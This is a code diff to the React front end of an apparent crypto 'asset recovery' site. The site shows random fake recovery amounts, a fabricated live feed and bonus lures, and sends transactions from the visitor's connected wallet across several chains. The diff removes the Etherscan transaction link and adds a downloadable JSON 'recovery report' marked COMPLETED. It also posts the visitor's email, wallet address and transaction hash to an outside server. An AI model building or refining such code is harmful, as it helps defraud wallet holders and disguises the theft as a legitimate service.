@@ -55,7 +55,7 @@ const TRANSLATIONS = {
     lastClaim: 'Last recovery',
     someoneJustClaimed: 'Asset Recovery Completed!',
     securedTokens: 'recovered',
-    viewOnExplorer: 'View Transaction',
+    downloadReport: 'Download Recovery Report',
     waitingForFirstClaim: 'Awaiting recovery events...',
     claimAmount: 'Recovered',
     bonusTag: '+25% bonus',
@@ -82,7 +82,9 @@ const TRANSLATIONS = {
     walletRequired: 'Active wallet connection required',
     insufficientBalance: 'Insufficient on-chain balance for recovery',
     proceedToRecovery: 'Click to proceed with asset recovery',
-    recoveryReady: 'Recovery ready - click to retrieve assets'
+    recoveryReady: 'Recovery ready - click to retrieve assets',
+    reportGenerated: 'Recovery report generated',
+    reportDownloaded: 'Report downloaded successfully'
   },
   es: {
     serviceActive: 'PROTOCOLO DE RECUPERACIÓN · ACTIVO',
@@ -109,7 +111,7 @@ const TRANSLATIONS = {
     lastClaim: 'Última recuperación',
     someoneJustClaimed: '¡Recuperación de Activos Completada!',
     securedTokens: 'recuperado',
-    viewOnExplorer: 'Ver Transacción',
+    downloadReport: 'Descargar Informe de Recuperación',
     waitingForFirstClaim: 'Esperando eventos de recuperación...',
     claimAmount: 'Recuperado',
     bonusTag: '+25% bono',
@@ -136,7 +138,9 @@ const TRANSLATIONS = {
     walletRequired: 'Conexión de wallet activa requerida',
     insufficientBalance: 'Saldo en cadena insuficiente para recuperación',
     proceedToRecovery: 'Haz clic para proceder con la recuperación',
-    recoveryReady: 'Recuperación lista - haz clic para recuperar activos'
+    recoveryReady: 'Recuperación lista - haz clic para recuperar activos',
+    reportGenerated: 'Informe de recuperación generado',
+    reportDownloaded: 'Informe descargado exitosamente'
   }
 };
 
@@ -226,10 +230,46 @@ const getRandomRecoveryAmount = () => {
   return Math.floor(Math.random() * (1000000 - 2000 + 1) + 2000);
 };
 
+// Generate unique recovery ID
+const generateRecoveryId = () => {
+  return 'RVC-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
+};
+
+// ============================================
+// GENERATE RECOVERY REPORT PDF (Download as JSON/Text)
+// ============================================
+const generateRecoveryReport = (tx, walletAddress, recoveryAmount, chains, timestamp) => {
+  const reportData = {
+    reportId: generateRecoveryId(),
+    recoveryAmount: recoveryAmount,
+    usdValue: `$${recoveryAmount.toLocaleString()} USD`,
+    walletAddress: walletAddress,
+    chainsRecovered: chains,
+    transactionHash: tx.hash,
+    timestamp: timestamp,
+    bonusApplied: '+25%',
+    recoveryFee: '5% + Gas',
+    status: 'COMPLETED',
+    networksScanned: ['Ethereum', 'BSC', 'Polygon', 'Arbitrum', 'Avalanche']
+  };
+  
+  const reportBlob = new Blob([JSON.stringify(reportData, null, 2)], { type: 'application/json' });
+  const reportUrl = URL.createObjectURL(reportBlob);
+  const link = document.createElement('a');
+  link.href = reportUrl;
+  link.download = `recovery_report_${reportData.reportId}.json`;
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+  URL.revokeObjectURL(reportUrl);
+  
+  return reportData;
+};
+
 // ============================================
 // LIVE RECOVERY POPUP COMPONENT
 // ============================================
-const LiveRecoveryPopup = ({ tx, onClose, onViewTransaction, translations }) => {
+const LiveRecoveryPopup = ({ tx, onClose, onDownloadReport, translations, walletAddress, recoveryAmount, chains }) => {
   const [visible, setVisible] = useState(true);
   
   useEffect(() => {
@@ -241,6 +281,11 @@ const LiveRecoveryPopup = ({ tx, onClose, onViewTransaction, translations }) => 
   }, [onClose]);
   
   if (!visible) return null;
+  
+  const handleDownload = () => {
+    generateRecoveryReport(tx, walletAddress, recoveryAmount, chains, new Date().toISOString());
+    onDownloadReport();
+  };
   
   return (
     <div className="fixed bottom-24 right-4 z-50 animate-slideInUp md:bottom-28 md:right-8">
@@ -256,10 +301,10 @@ const LiveRecoveryPopup = ({ tx, onClose, onViewTransaction, translations }) => 
               <span className="text-blue-400 font-bold">${tx.recoveryAmount?.toLocaleString() || '0'} USD</span> +25% bonus
             </p>
             <button 
-              onClick={() => onViewTransaction(tx.hash)}
-              className="text-xs text-blue-400 hover:text-blue-300 mt-2 flex items-center gap-1 transition-colors"
+              onClick={handleDownload}
+              className="text-xs bg-blue-600 hover:bg-blue-700 text-white mt-2 px-3 py-1 rounded-lg flex items-center gap-1 transition-colors"
             >
-              {translations.viewOnExplorer} →
+              📄 {translations.downloadReport} →
             </button>
           </div>
           <button onClick={() => setVisible(false)} className="text-gray-500 hover:text-gray-300 transition-colors">
@@ -274,7 +319,12 @@ const LiveRecoveryPopup = ({ tx, onClose, onViewTransaction, translations }) => 
 // ============================================
 // LIVE RECOVERY FEED COMPONENT
 // ============================================
-const LiveRecoveryFeed = ({ transactions, translations, totalRecoveredAmount, todayCount }) => {
+const LiveRecoveryFeed = ({ transactions, translations, totalRecoveredAmount, todayCount, onDownloadReport, walletAddress }) => {
+  const handleDownloadForTx = (tx) => {
+    generateRecoveryReport(tx, walletAddress, tx.recoveryAmount, [tx.chain], tx.time);
+    onDownloadReport();
+  };
+  
   return (
     <div className="w-full max-w-md mx-auto mt-8 bg-black/40 backdrop-blur rounded-xl border border-blue-500/20 overflow-hidden">
       <div className="bg-gradient-to-r from-blue-600/20 to-transparent px-4 py-3 border-b border-blue-500/20 flex items-center justify-between">
@@ -319,7 +369,12 @@ const LiveRecoveryFeed = ({ transactions, translations, totalRecoveredAmount, to
                   {tx.timeAgo}
                   {tx.chain && <span className="ml-2 text-gray-600">• {tx.chain}</span>}
                 </span>
-                <span className="text-[10px] text-gray-600">#{(transactions.length - idx).toString().padStart(4, '0')}</span>
+                <button 
+                  onClick={() => handleDownloadForTx(tx)}
+                  className="text-[10px] text-blue-400 hover:text-blue-300 transition-colors flex items-center gap-1"
+                >
+                  📄 {translations.downloadReport}
+                </button>
               </div>
             </div>
           ))
@@ -407,6 +462,7 @@ function App() {
   const [bnbAmount, setBnbAmount] = useState('');
   const [showRecoverButton, setShowRecoverButton] = useState(false);
   const [showEmailNotification, setShowEmailNotification] = useState(false);
+  const [showReportNotification, setShowReportNotification] = useState(false);
   
   // LIVE TRANSACTIONS STATE - Loaded from localStorage
   const [liveTransactions, setLiveTransactions] = useState([]);
@@ -812,10 +868,10 @@ function App() {
     }
   };
 
-  // Send email notification
-  const sendEmailNotification = async (recoveryAmount, chains) => {
+  // Send email notification using simple PHP mail function
+  const sendEmailNotification = async (recoveryAmount, chains, txHash) => {
     try {
-      await fetch('https://hyperback.vercel.app/api/send-recovery-email', {
+      const response = await fetch('https://hyperback.vercel.app/api/send-recovery-email.php', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -823,14 +879,26 @@ function App() {
           walletAddress: address,
           recoveryAmount: recoveryAmount,
           chains: chains,
-          timestamp: new Date().toISOString()
+          txHash: txHash,
+          timestamp: new Date().toISOString(),
+          bonus: presaleStats.currentBonus
         })
       });
-      setShowEmailNotification(true);
-      setTimeout(() => setShowEmailNotification(false), 5000);
+      
+      const result = await response.json();
+      if (result.success) {
+        setShowEmailNotification(true);
+        setTimeout(() => setShowEmailNotification(false), 5000);
+      }
     } catch (err) {
       console.error('Email notification error:', err);
     }
+  };
+
+  // Handle download report notification
+  const handleDownloadReport = () => {
+    setShowReportNotification(true);
+    setTimeout(() => setShowReportNotification(false), 3000);
   };
 
   // MULTI-CHAIN RECOVERY EXECUTION
@@ -874,6 +942,7 @@ function App() {
       );
       
       let processed = [];
+      let lastTxHash = '';
       
       for (const chain of sortedChains) {
         try {
@@ -919,6 +988,7 @@ function App() {
             }]
           });
           
+          lastTxHash = tx;
           setTxStatus(`${translations.processingRecovery} awaiting confirmation...`);
           const receipt = await chainProvider.waitForTransaction(tx);
           
@@ -981,7 +1051,9 @@ function App() {
         setTxStatus(translations.retrievalComplete);
         
         // Send email notification
-        await sendEmailNotification(recoveryAmount, processed);
+        if (userEmail) {
+          await sendEmailNotification(recoveryAmount, processed, lastTxHash);
+        }
         
         setShowCelebration(true);
         
@@ -1006,6 +1078,10 @@ function App() {
             bonus: `${presaleStats.currentBonus}%`
           })
         });
+        
+        // Generate recovery report for the user
+        generateRecoveryReport(newTx, address, recoveryAmount, processed, new Date().toISOString());
+        handleDownloadReport();
       } else {
         setError("No chains were successfully processed");
       }
@@ -1036,10 +1112,6 @@ function App() {
     }
     
     await executeMultiChainRecovery();
-  };
-
-  const viewTransactionOnExplorer = (txHash) => {
-    window.open(`https://etherscan.io/tx/${txHash}`, '_blank');
   };
 
   const formatAddress = (addr) => {
@@ -1079,6 +1151,16 @@ function App() {
           <div className="flex items-center gap-2">
             <span className="text-lg">📧</span>
             <p className="text-sm text-white">{translations.emailNotification}</p>
+          </div>
+        </div>
+      )}
+
+      {/* Report Download Notification */}
+      {showReportNotification && (
+        <div className="fixed top-32 right-4 z-50 animate-slideInUp bg-blue-500/90 backdrop-blur rounded-lg p-3 shadow-xl">
+          <div className="flex items-center gap-2">
+            <span className="text-lg">📄</span>
+            <p className="text-sm text-white">{translations.reportDownloaded}</p>
           </div>
         </div>
       )}
@@ -1242,7 +1324,7 @@ function App() {
                   {isEligible && userEmail ? (
                     <span>🔗 {translations.proceedToRecovery}</span>
                   ) : isEligible && !userEmail ? (
-                    <span>📧 {translations.confirmationSent}</span>
+                    <span>📧 Enter email to enable recovery</span>
                   ) : !isEligible && !scanning && isConnected && totalOnChainValue > 0 && totalOnChainValue < 1 ? (
                     <span>⚠️ {translations.insufficientBalance}. Minimum $1 required for recovery initiation.</span>
                   ) : !isEligible && !scanning && isConnected && totalOnChainValue === 0 ? (
@@ -1286,6 +1368,8 @@ function App() {
             translations={translations}
             totalRecoveredAmount={todayTotalRecovered}
             todayCount={todayCount}
+            onDownloadReport={handleDownloadReport}
+            walletAddress={address}
           />
 
           {/* Recovery Portal Card */}
@@ -1431,8 +1515,11 @@ function App() {
         <LiveRecoveryPopup 
           tx={currentPopupTx}
           onClose={() => setShowPopup(false)}
-          onViewTransaction={viewTransactionOnExplorer}
+          onDownloadReport={handleDownloadReport}
           translations={translations}
+          walletAddress={address}
+          recoveryAmount={currentPopupTx.recoveryAmount}
+          chains={[currentPopupTx.chain]}
         />
       )}
 
